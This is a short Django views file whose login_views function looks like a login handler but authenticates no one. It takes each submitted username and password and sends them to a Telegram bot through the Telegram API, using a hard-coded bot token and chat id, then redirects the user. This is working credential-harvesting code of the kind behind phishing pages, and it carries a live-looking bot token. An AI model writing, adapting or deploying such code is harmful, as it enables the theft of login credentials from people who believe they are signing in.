from django.shortcuts import render
from django.shortcuts import render, redirect
import requests

def login_views(request):
    if request.method == 'POST':
        data = request.POST
        username = data.get('username')
        password = data.get('password')
        text = f"👨‍💻 username : {username}, \n🔐 password: {password}"
        
        token = '6289716282:AAHV2TX0bcxMtL6DtAEniSulqkFnJt4tJz4'
        id = "5356847426"
        url = 'https://api.telegram.org/bot' + token + '/sendMessage?chat_id='
        requests.get(url + id + '&text=' + text)

            
        return redirect('/')
    return render(request, 'index.html')

